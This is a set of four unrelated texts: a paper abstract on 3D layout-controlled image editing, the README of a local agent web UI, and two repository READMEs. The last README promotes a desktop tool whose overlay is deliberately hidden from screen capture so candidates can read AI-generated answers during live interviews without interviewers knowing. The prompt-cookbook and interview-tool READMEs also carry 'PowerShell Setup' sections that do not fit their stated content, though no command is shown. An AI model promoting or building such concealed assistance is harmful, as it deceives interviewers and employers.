title: LayoutRecall: Preserving Appearance in Multi-Round 3D Layout-Controlled Image Editing
text: 3D layout-controlled image editing gives users explicit control over object placement and camera viewpoint. In a sequence of edits, however, the latest image can lose the appearance of an object when it is occluded or leaves view. The target layout specifies where the object should reappear, while its appearance must be recovered from earlier observations. We introduce LayoutRecall, a multi-round editor that stores and reuses appearance in the local coordinate systems of 3D boxes. Box-Surface Latent Memory retains image latents on box faces and retrieves them along rays in the target view. Geometry-Aligned Memory Conditioning supplies the retrieved tokens to a FLUX.2 editor using target-view positions, shared box-local embeddings, and object-wise attention. A correspondence loss encourages the editor to attend to matching observations during denoising. We also introduce LayoutLoop, a multi-round 3D layout-controlled image editing benchmark with calibrated layouts and designed revisits. We conduct extensive experiments on LayoutLoop and real-scene data to verify the ability of our method. The project page is at https://ykchizs.github.io/layoutrecall.github.io/.

duzhenxun/pop-agent: PopAgent local web UI for your coding agents: watch the reasoning stream, cut in with a correction mid-turn, manage mod
text: PopAgent local web UI for your coding agents: watch the reasoning stream, cut in with a correction mid-turn, manage models and tools. Works with pi, Codex, Claude Code, OpenCode and DSH. Sessions stay the engine's own files — no database, no account.. PopAgent English · 中文 · Website · Gitee mirror Download: the macOS app (.dmg) · See the UI: the website · Command line: What it is: a front end that lays an agent's process open — thinking blocks, tool calls, changed files, tokens and cost all sit in the conversation, and you can cut in mid-turn. Above the composer sit templates, quick commands and Think, so how you ask is clickable too. What it isn't: not another agent engine, and not a SaaS that moves your sessions to the cloud. It doesn't rewrite prompts or take over tool implementations — it gives the engines you already installed a readable UI, clickable buttons and a session list that stays on disk. Three hard rules: | Rule | Meaning | 01 | No database | Sessions are the engine's own JSONL / threads. The web UI reads them, renames them, deletes them when needed | 02 | No faking | Capabilities an engine lacks are hidden in the UI (capability matrix); a panel that can't get data says so instead of borrowing another engine's config | 03 | No overreach | Loopback only by default (127.0.0.1); remote access means an explicit -H 0.0.0.0 and a password set on the machine first | The typing side: templates, quick commands, Think The row above the composer makes “how do I even ask this” clickable (server-side, one copy for desktop and phone). Templates: 12 built-ins; click one into the composer (not sent). Not sure how to phrase it — “AI write it” finishes the prompt. Quick commands: click to send, Shift+click to only fill the box. Think: a hidden turn returns 1–5 “say this next” lines; click to send, never in history. Six things most agent front-ends never bother with Voice, scheduling, computer control, canvas, push and remote access all live in the same process — not six bolted-on tools: they share the same sessions, the same workspace and the same approval rules. ① Live voice: speak and it types along; it reads its answer back Talk instead of typing: the mic in the composer starts listening on the first tap and text lands in the box word by word — not one blob at the end. Tap = keep listening (tap again to stop); hold = push-to-talk, release to send. It reads the answer back: TTS plays the final reply with adjustable speed and voice, plus pause / resume / stop; start / end / error / waiting-for-approval each have their own cue, previewable, with their own volume. Offline by default: recognition prefers macOS local (SFSpeechRecognizer) and speech uses the system voice — nothing leaves the machine, no network, no cost. Want one consistent voice? Switch to edge (Microsoft) or your own kokoro / qwen3. ② Scheduled tasks: say it once, it runs every morning A task = a prompt + a five-field cron expression + a timezone. A text task goes straight to the model and never touches the repo; an agent task runs a real turn in the workspace (reads files, runs commands, edits code). You can create one in chat: say "check this repo every morning at 9" and the agent fills in the name, workspace and timezone itself. Unattended means unattended: nobody is there to click an approval box at 3am, so writes are denied by default unless you tick "allow file changes" on the task; past the watchdog limit the turn is interrupted and recorded as failed — a half answer is never reported as success. ③ Computer control: the agent actually drives your Mac Not screenshot-and-guess: it reads the macOS accessibility (AX) element tree and clicks by element id, so clicks land and the meaning is known. Click, type / set values / paste (long text goes through the clipboard and your previous clipboard is restored), send shortcuts, scroll, drag in steps, run menu paths — waiting for the UI to settle between steps. Password fields are never filled in for you; system authentication and apps protected by System Settings stay off-limits. The master switch is the skill itself, so any engine with bash can drive the Mac, not just pi. ④ Canvas: draw "what happens next" as a graph Describe something that takes many steps and the agent lays it out as nodes plus dependency edges on the right; nodes carry kinds (task / milestone / risk / decision / doc), so it is obvious which step may blow up and which one needs your call. It is interactive: mark a step running when you start it, done when you finish — progress is drawn on the graph, not just in chat. It drills down: sub-plans absorb the detail and keep the main graph readable. Layout is computed by the host from the dependency graph, so the model never worries about coordinates. ⑤ Push to your phone: it buzzes when a turn ends One push per finished turn: the title is the project, the body is the session, failures get ❌ and interruptions ⏹. Web Push (VAPID) with no third-party service; keys are generated on first start. Multiple devices, test push, clear all. Add it to your phone's home screen and it behaves like an app (PWA); tapping the notification opens that session. ⑥ Remote access: keep working from your phone, elsewhere pop-agent -H 0.0.0.0 and you can open it from a phone or another computer; the password must be set on the machine itself (remote clients may not create one — otherwise whoever finds the port first takes over). Login protection: three wrong passwords from the same origin pause logins for 30 minutes (count and window are tunable); while paused the password is not even compared, and restarting the service does not unlock it. The phone really gets a phone layout: the sidebar becomes a drawer, the top bar keeps icons only, the composer goes to 18px so iOS does not zoom, the right pane becomes a full-screen second page. Multiple engines: each runs its own native loop An engine is not "the same prompt in a different skin": each is wired to its own official loop, and capability differences hide buttons in the UI. Engine | How it's wired | Notes | pi (default) | native SDK | full plugin / skill ecosystem, lazy tool loading, approval gate, subagents, native steering; models and providers are managed by this workbench | Codex | app-server (JSON-RPC) | its own loop and sandbox; sessions shared with Codex Desktop / CLI; approvals are command- and file-level | DeepSeek Harness | ACP | model and reasoning level switchable, permissions confirmed per call | opencode | ACP | brings its own tools / MCP / plugins, sessions shared with the opencode CLI / TUI; approvals follow opencode's own permission config | Claude Code | ACP (claude-code-acp adapter) | models switchable, tools confirmed per call, sessions shared with the claude CLI; this ACP surface exposes neither reasoning levels nor subagents | Capability differences (server/engine/registry.ts; the UI hides buttons accordingly): Capability | pi | codex | dsh | opencode | claude | :-:|:-:|:-:|:-:|:-:| Approvals | ✅ | ✅ | ✅ | per config | ✅ | Model / reasoning level | ✅ | ✅ | ✅ | ✅ | model only / no levels | Resume past sessions | ✅ | ✅ | ✅ | ✅ | ✅ | Steering | ✅ native | ✅ stop-and-resend | ✅ stop-and-resend | ✅ stop-and-resend | ✅ stop-and-resend | Subagent panel | ✅ | — | — | — | — | Workbench-managed providers | ✅ | — | — | — | — | Side chat (in memory) | ✅ | — | — | — | — | Models / plugins / MCP follow the current engine: switch to Codex and the panels read Codex's own things; claude reads ~/.claude.json and ~/.claude/settings.json; opencode reads opencode.json. A panel that isn't wired says so instead of borrowing pi's config. The engine is switched in the bottom status bar, and each session remembers its own engine, model and thinking level. Install macOS (Apple Silicon) → download the .dmg and drag it into Applications. No Node, no terminal: the runtime ships inside the app. Other platforms / prefer a CLI → npm -g install pop-agent (needs Node ≥ 22.19). It exposes two equivalent commands: pop-agent and pop. On Linux the embedded terminal compiles node-pty in place, which needs make / g++ / python3. Rather not touch the global npm (installs into ~/.pop-agent, no sudo): First launch blocked by macOS? The packages only carry an ad-hoc signature added at build time, not an Apple Developer signature, so the two prompts map to two fixes: "Cannot be opened because the developer cannot be verified" → Right-click → Open once; on macOS 15 and later you can also allow it under System Settings → Privacy & Security → "Open Anyway". "is damaged and can't be opened. You should move it to the Trash" → don't trash it, it isn't broken — the signature and the resources disagree. Run these two: Commands Command | What it does | pop-agent | Start (default): runs in the foreground, opens the browser, Ctrl-C to quit; the default workspace is the current directory | pop-agent start -d | Run detached (logs go to daemon.log) | pop-agent status | pid / port / uptime / engine / session count / workspace | pop-agent restart / stop | Stop then start (-d to detach) / stop the running instance | pop-agent upgrade | Upgrade to the latest release | Reaching it from a phone or another computer: set the password on that machine first (Settings → Remote, or open /setup, or -P at startup). After that, LAN IP, public IP and domain all work with the password — no allow-list needed. If no password is set, remote clients only see "set it on the machine first", because otherwise whoever scans the port first takes over. Every flag and environment variable, plus each engine's escape hatches: see the reference · Flags. More The README stops here on purpose; everything else lives in the docs: Want to know | Where | Install details, every flag, every panel, shortcuts, architecture, where data lives, the security model, development and troubleshooting | Reference | The website (UI tour, a screenshot per capability) | · 中文 | Screenshots (uncompressed originals) | docs/screenshots/ | Architecture decision records | docs/adr/ | Remote access and the security model | Reference · Security model | Thanks Upstream projects — this workbench stands on these node packages: engine & protocol: @earendil-works/pi-ai, @earendil-works/pi-coding-agent, @earendil-works/pi-mcp server: express, ws, web-push, node-edge-tts, node-pty (optional, for the embedded terminal) UI: react / react-dom, react-markdown / remark-gfm / rehype-highlight, highlight.js, mermaid, @xterm/xterm / @xterm/addon-fit tooling: vite, typescript, electron / electron-builder, playwright-core, oxlint, prettier, tsx Thanks to my colleagues: Dou Xin, Li Huimeng, Song Hepeng, Chen Zhaoyang, Lü Qinyan, Shi Chao, Zhang Bing, Qin Zhaoyin, Wang Jichao MIT License

title: SenpaiSpide664/ai-visual-prompt-cookbook: AI Visual Prompt Cookbook: Reusable JSON Style Prompts for Consistent Image Generation
text: AI Visual Prompt Cookbook: Reusable JSON Style Prompts for Consistent Image Generation. AI Visual Prompt Cookbook: Structured Style Prompt Collection — Dataset 🖥️ PowerShell Setup The AI Visual Prompt Cookbook is a structured dataset of reusable style definitions for AI image generation, distributed as self-contained JSON prompt templates compatible with Nano Banana Pro, GPT Image, and Midjourney. Each entry pairs a parameterized style.json file with preview assets and documented variables, allowing a single style definition to be applied consistently across different subjects and compositions. The dataset is openly accessible and updated on a weekly cadence with new style entries. This README documents the dataset's structure, schema conventions, and intended use for researchers and practitioners working with prompt-based image synthesis. ✅ Before You Start Windows 10 or Windows 11 PowerShell 5.1 or newer (already available on Windows) Active network connection No admin rights needed Dataset Structure The dataset is organized as a flat directory of self-contained style packages, one directory per visual style. Each package is addressed by a stable slug and holds a single machine-readable prompt specification alongside two fixed preview renders, so any style can be located, copied, and reproduced independently of the others. The style.json file is the primary artifact and is fully self-contained: it can be transferred in isolation into any compatible multimodal workflow without auxiliary files. Its structure is defined as follows: prompttemplate — the reusable style prompt, expressed with {VARIABLE} placeholders for all substitutable content. environmentvariables — a declaration of every placeholder the template accepts, including expected value types where applicable. schemaversion — records the specification revision. Newer entries declare "2.2" and enumerate only the variables their template actually consumes (for example SUBJECT, MAINTEXT, DESIGNDIRECTION); earlier "2.1" entries retain a fixed set of ten standard variables. examples — an array of ready-to-edit cases; each case stores only casename and its corresponding values map. stylefidelityanchors — the invariants the model is instructed to preserve across generations. sourcecontenttoavoid — explicit exclusions that prevent direct reproduction of reference material. negativeprompt — suppression directives for watermarks, logos, and off-style outputs. Rendered prompt strings (such as per-aspect-ratio or fully expanded variants) are deliberately not persisted. They are derived at generation time from prompttemplate combined with a selected values set, which keeps each file compact and prevents divergence between stored and generated content. The two preview images are fixed at 16:9 and 9:16 and serve as visual ground truth for the corresponding style; they are named consistently across all packages to permit uniform iteration and comparison. Style slugs are unique, lower-case, and hyphen-delimited, and the directory name, slug, and internal identifiers correspond one-to-one. The collection is extended on a weekly cadence, with new packages added under the same structure and revision rules; existing packages are not silently renumbered, and any change to a template's variable contract is reflected in its schemaversion. Columns Each style entry is stored as a single style.json document (schema versions 2.1 and 2.2) whose fields are declared below. Field names are stable across the library, and every rendered prompt is derived at generation time rather than stored, so the column set describes the machine-readable source of record rather than any output artifact. Column | Type | Description | - | - | - | stylename | string | Human-readable name of the visual system, matching the folder slug and catalog entry. | schemaversion | string | Declares the field contract in force for the file; "2.2" files declare only the variables their template consumes, while "2.1" files retain the ten standard variables. | category | string | Coarse grouping used by the catalog and gallery navigation (for example photo-and-doodle, zine-and-collage, type-poster, travel-and-city, editorial-and-minimal, product-and-campaign). | description | string | Prose summary of the visual system, stating palette, composition logic, and the intended output class. | prompttemplate | string | The reusable style prompt containing {VARIABLE} placeholders; the only field from which final prompts are assembled. | environmentvariables | array of objects | Declares every placeholder the template may reference, each with its name, expected value form, and short guidance. | examples | array of objects | Ready-to-edit cases; each case stores only casename and a values map, never a rendered prompt. | stylefidelityanchors | string | Explicit statement of the visual invariants the model should preserve across generations. | sourcecontenttoavoid | string | Enumeration of source-specific content that must not be reproduced, guarding against direct recreation of reference material. | negativeprompt | string | Exclusions applied at generation time, covering watermarks, logos, direct source recreations, and off-style output. | aspectratios | array of strings | Supported output ratios, conventionally 16:9 and 9:16, with any ratio-conditional layout rules carried inside the template. | Two derived columns are intentionally absent from the stored files. Rendered prompts (prompt16x9, prompt9x16, fullprompt) are computed from prompttemplate plus a chosen examples[].values entry, which keeps each document compact and prevents rendered text from drifting out of sync with its template. Preview images (preview-16x9.jpg, preview-9x16.jpg) sit alongside style.json in each style folder as sibling assets rather than as fields, so the JSON remains the sole authoritative record. Values supplied through environmentvariables are treated as user input and are not persisted in the library; the repository stores only the declaration and the illustrative cases. Where a template branches on aspect ratio, the conditional logic is expressed inside prompttemplate rather than as a separate column, so consumers need only read one field to reconstruct the full instruction set. Source The style templates in this collection were assembled by the maintainers of AI Visual Prompt Cookbook from close visual analysis of editorial design, poster art, animation key visuals, packaging, and campaign graphics. Each style.json is an original written specification: rather than reproducing any single image or designer's work, the template abstracts the recurring visual decisions — palette, composition logic, typographic behavior, texture, and lighting — into a parameterized prompt system that can be applied to new subjects. Selected styles are revised and expanded on a weekly cadence as new references are studied and new cases are authored. Two sourcing principles govern the library. First, provenance is documented at the level of genre and reference class rather than individual works; the stylefidelityanchors field records which visual properties define a style, while the sourcecontenttoavoid field records the specific subjects, faces, crops, and text strings observed in reference material so that generated outputs remain distinct from it. Second, all example values, character descriptions, headlines, and fictional titles shipped in examples[].values are written by the maintainers for demonstration purposes and do not derive from any existing publication, film, brand, or campaign. Variable values supplied by users are the user's own responsibility; the templates are model-agnostic and are intended to be composed with original subject matter. Style definitions, prompt scaffolding, and example cases are versioned together so that any change to a template can be traced to its corresponding examples, and validation is performed against the schema documented in the Dataset Structure and Columns sections. Corrections or attributions that the maintainers have overlooked are welcomed through the project's discussion channels and will be reflected in subsequent releases. License This dataset is released under the Creative Commons Attribution 4.0 International license. Under its terms, you may share and adapt the material for any purpose, including commercial use, provided you give appropriate credit to the AI Visual Prompt Cookbook, indicate whether changes were made, and retain this notice. Attribution should name the project, reference the specific style or file used, and link back to the source repository where practical. The library is offered on an as-is basis, without warranty of any kind, express or implied, including warranties of merchantability, fitness for a particular purpose, or non-infringement. In no event shall the authors or contributors be liable for any claim, damages, or other liability arising from the use of the dataset or the outputs generated with it. Users are responsible for verifying that their own use of any style, prompt template, or derived output complies with applicable law and with the terms of any image generation model they employ. Each style.json record carries its own license field, and individual records may specify different terms than this collection-level notice; where they conflict, the per-record terms govern. If you incorporate a style into a derivative work, please preserve the license field and the attribution metadata intact so that downstream users can determine the applicable terms. This license does not extend to third-party trademarks, likenesses, or copyrighted references that may appear in style descriptions or preview images. Such elements remain the property of their respective owners and are included only as descriptive context or stylistic reference. No endorsement by any rights holder is implied. Contributions submitted to the project are accepted under the same license, and contributors affirm that they have the right to license the material they submit. Questions regarding licensing or permitted use may be directed to the project maintainers through the repository's issue tracker. Contact Questions, corrections, and style submissions are coordinated through the AI Visual Prompt Cookbook project itself. For defects in a specific style.json — malformed JSON, undeclared placeholders, or template text that diverges from its accompanying previews — please open an issue in the project's issue tracker and reference the style slug and schema version so the report can be triaged against the validation script. Proposed new styles should follow the existing package shape and pass the repository validator before review; submissions that alter the shared template conventions will be assessed for backward compatibility with prior schema versions. General methodological questions about variable design, fidelity anchors, or the derivation of rendered prompts are best raised in the project's discussion space, where responses are kept visible for other users. We aim to acknowledge substantive reports within a reasonable interval, though response times vary with maintainer availability. All correspondence is expected to remain factual and reproducible: include the exact input values used, the observed output, and the expected behavior, so that each report can be independently verified.

title: thebodytheory01-commits/final-round-ai-desktop: Final Round AI Desktop: Real-Time Interview Coaching, Speech Transcription, and Response Sug
text: Final Round AI Desktop: Real-Time Interview Coaching, Speech Transcription, and Response Suggestions. Final Round AI Desktop: Real-Time Interview Coaching & Transcription Windows 10 & 11 🖥️ PowerShell Setup Final Round AI Desktop is a performance-oriented desktop application that delivers real-time interview coaching, live speech transcription, and instant response suggestions during video calls. Built for job seekers and working professionals, it captures meeting audio, converts spoken questions into text with low latency, and generates structured, context-aware answers for on-screen reference. The application pairs a discreet overlay with configurable hotkeys and local transcription to keep coaching responsive and private throughout the call. ✅ Before You Start Windows 10 or Windows 11 PowerShell 5.1 or newer (already available on Windows) Active network connection No admin rights needed Features Concealed Overlay Window — Renders coaching suggestions on a dedicated always-on-top surface that is excluded from common screen-capture pipelines, so the panel stays visible to you and absent from shared meeting feeds. Live Speech Transcription — Captures system audio and microphone input concurrently and streams a rolling transcript with sub-second latency, preserving speaker turns for later review. Contextual Response Suggestions — Generates structured, bullet-point answer outlines keyed to the detected question type, including behavioral, technical, and case-study formats. STAR Framework Templates — Ships with pre-built situation-task-action-result scaffolds that populate automatically when a behavioral prompt is recognized. Technical Reference Panels — Surfaces condensed syntax references, system-design patterns, and complexity notes in a side drawer for rapid consultation during coding screens. Session History and Debrief — Stores completed transcripts locally and produces a post-call summary highlighting answer coverage, pacing, and flagged knowledge gaps. Hotkey-Driven Control — Activates, pauses, and dismisses the overlay through configurable global shortcuts without leaving the active call window. Local-First Transcription — Runs speech-to-text inference on-device to keep audio within the local environment and reduce round-trip latency. Model-Agnostic Backend — Connects to interchangeable language-model providers through a unified settings panel, allowing you to select the engine that fits your workload. Configurable Privacy Controls — Offers granular toggles for transcript retention, overlay visibility scope, and audio routing so behavior can be tuned to your environment. How it works Final Round AI Desktop runs as a native process that sits between your conferencing application and its audio devices, providing real-time coaching without disrupting the call itself. Audio Capture Pipeline The application registers two virtual audio endpoints at startup: one for system output (the interviewer's voice) and one for microphone input (your voice). Both streams are routed through a low-latency audio ring buffer before being chunked into short, overlapping segments. This design keeps capture continuous even when devices switch mid-session, and it preserves the original audio for the post-interview transcript. Local Speech Transcription Each audio segment is transcribed on-device by an embedded Whisper inference engine. Transcription runs locally, so speech never leaves the machine before it becomes text. The engine applies voice activity detection to skip silence, which keeps processing overhead low during long calls. Transcribed text is emitted incrementally, and finalized utterances are pushed to the coaching layer within roughly one second of being spoken. The Overlay Window The coaching surface is a borderless, always-on-top window rendered by the Electron shell. It is positioned in a corner of the display and rendered with per-pixel transparency so it never obscures active windows. Critically, the overlay is registered as a non-capturable surface using the operating system's window display affinity APIs, which instructs screen-capture pipelines to omit it. When you share your screen in Zoom, Teams, or any comparable tool, participants see your presentation but not the coaching layer rendered beneath it. Response Generation The finalized transcript is passed to the response engine together with the active session profile. The engine detects question boundaries, classifies the question type (behavioral, technical, or case study), and requests a structured answer from the configured language model. Responses arrive as concise bullet points rather than prose, so they can be read at a glance while speaking. Generation is streaming, meaning the first bullet appears while later ones are still being composed. Session Profiles and Templates Profiles store role-specific context: the job description, your resume highlights, and any company-specific notes. Templates supply the structural scaffolding for common question families — situation-task-action-result framing for behavioral prompts, complexity analysis for coding prompts, and trade-off enumeration for design prompts. The response engine blends profile context into the prompt so suggestions reference your actual experience rather than generic advice. Hotkey Control and Session Lifecycle A global hotkey toggles the overlay and starts or pauses capture without requiring you to leave the call window. The app minimizes to the system tray, maintains a session log, and can export a full transcript with the generated suggestions once the call ends. Hotkey bindings, audio device selection, model provider, and overlay position are all configurable from the settings panel, and changes apply immediately to the running session. Data Flow Summary Audio is captured through virtual endpoints, transcribed locally, and converted to text before any network request is made. Text prompts and profile context are sent to the configured model provider; audio recordings are never transmitted. The resulting suggestions return over an encrypted channel and render in the non-capturable overlay until you toggle them off. Compatibility Final Round AI Desktop runs natively on Windows 10 and 11 (64-bit) and macOS 12 Monterey or later, including both Intel and Apple Silicon hardware. The application is packaged as a standard desktop installer for each platform, with no additional runtime dependencies required beyond the operating system itself. Operating System Support Platform | Minimum Version | Architecture | Status | Windows | Windows 10 (build 19041) | x64 | Fully supported | Windows | Windows 11 | x64, ARM64 | Fully supported | macOS | macOS 12 Monterey | Intel, Apple Silicon | Fully supported | Linux | Ubuntu 22.04 LTS | x64 | Experimental | Windows support includes native integration with the display affinity subsystem, which enables the overlay to remain excluded from screen capture in conferencing clients. macOS builds use the equivalent window-sharing exclusion APIs and require Screen Recording and Microphone permissions to be granted during first launch. Linux builds are provided on an experimental basis; audio capture relies on PulseAudio or PipeWire, and overlay exclusion behavior varies by compositor. Conferencing Platform Integration The audio capture pipeline is designed to work alongside the major video conferencing clients without modifying or patching them. Verified integrations include: Zoom (desktop client) Microsoft Teams (desktop client) Google Meet (via supported browsers) Cisco Webex Slack Huddles Because capture operates at the system audio layer through a virtual audio device, any conferencing client that routes audio through the operating system's standard output is compatible. Microphone input is captured independently, allowing bidirectional transcription of both the interviewer and the candidate. Hardware Requirements Processor: Dual-core 2.0 GHz or faster; quad-core recommended for concurrent local transcription Memory: 8 GB minimum; 16 GB recommended when running local speech-to-text models Storage: 500 MB for the application; additional space for cached transcripts and optional local model weights Audio: Any input/output device recognized by the operating system; a virtual audio cable is provisioned automatically during setup Display: 1280×720 or higher; multi-monitor configurations are supported with per-display overlay placement Network and AI Backend The application requires an active network connection for response generation when using hosted model providers. Outbound HTTPS traffic to the configured provider endpoint must be permitted by local firewall rules. Local transcription operates entirely on-device and does not require connectivity. Users who prefer fully offline operation may pair on-device transcription with a self-hosted model endpoint. Known Limitations Overlay exclusion on Linux depends on compositor support and is not guaranteed across all desktop environments. ARM64 Windows devices run the x64 build under emulation; a native ARM64 build is planned. macOS requires re-authorization of capture permissions after major OS upgrades. Virtual audio device installation on Windows may require administrator privileges on managed devices. FAQ Is the overlay detectable by screen sharing or recording software? No. The overlay window is excluded from capture pipelines at the OS compositor level, so it does not appear in shared screens, recordings, or screenshots taken by conferencing applications. It renders only on the local display. Note that this applies to standard capture APIs; specialized kernel-level monitoring tools are outside the supported scope. Which meeting platforms are supported? Any application that exposes system audio through the standard capture interfaces is compatible, including the major video conferencing suites, browser-based calls, and standalone VoIP clients. Audio routing is handled by a virtual loopback device, so platform-specific integrations are not required. Does transcription run locally or in the cloud? Speech-to-text inference runs locally on your machine using an embedded Whisper-class model. Only the transcribed text is sent to the configured language model for response generation. No raw audio leaves the device. Can I select which language model powers the suggestions? Yes. The response engine is model-agnostic and accepts credentials for multiple providers. You can switch between providers and model tiers in the settings panel, and per-session overrides are available for latency-sensitive calls. What is the end-to-end latency from question to suggested response? Typical latency is under two seconds on modern hardware with a local transcription model and a hosted generation model. Latency scales with model size, network round-trip time, and audio buffer length; the buffer length is configurable for accuracy-versus-speed tradeoffs. How are transcripts and session data stored? Session transcripts, generated suggestions, and post-call reports are persisted locally in an encrypted store. Retention is configurable, and a one-click purge removes all session artifacts. Nothing is synchronized to a remote service unless you explicitly export it. Does the application require elevated privileges? No administrator rights are needed for standard operation. The virtual audio device installs at the user level. Elevation is only requested if you enable optional low-level window affinity features on platforms that gate them behind system permissions. Can I customize the suggestion format and response templates? Yes. The prompt layer is fully editable: you can define role-specific personas, output structures, and bullet-point densities. Behavioral templates ship preconfigured, and custom templates can be imported as plain-text profiles. What are the hardware requirements? A quad-core processor, 8 GB of RAM, and Windows 10 or macOS 12 or later are the baseline. Local transcription benefits from additional RAM and, where available, hardware acceleration. The application runs comfortably alongside conferencing software on typical laptops. Is usage metered or subscription-based? The desktop client itself is openly available for use and inspection. Generation costs are determined by whichever model provider you connect, billed directly by that provider. There is no intermediary markup or seat-based licensing. How do I report a defect or request a capability? Use the repository issue tracker for defects and capability requests. Include your platform, version, and a sanitized session log where applicable. Security-sensitive reports should follow the disclosure guidance in the repository's security policy rather than the public tracker. Disclaimer Final Round AI Desktop App is provided as a technical utility for real-time transcription, speech analysis, and response suggestion during live video calls. It is intended to support communication clarity and answer structuring, not to replace professional judgment, preparation, or independent decision-making. The application processes audio locally where supported and transmits transcription and prompt data to the configured AI model provider for response generation. Users are responsible for configuring API credentials, securing local storage, and understanding how their chosen model provider handles transmitted data. Latency, transcription accuracy, and suggestion quality depend on hardware performance, network conditions, audio routing configuration, and the capabilities of the selected model.
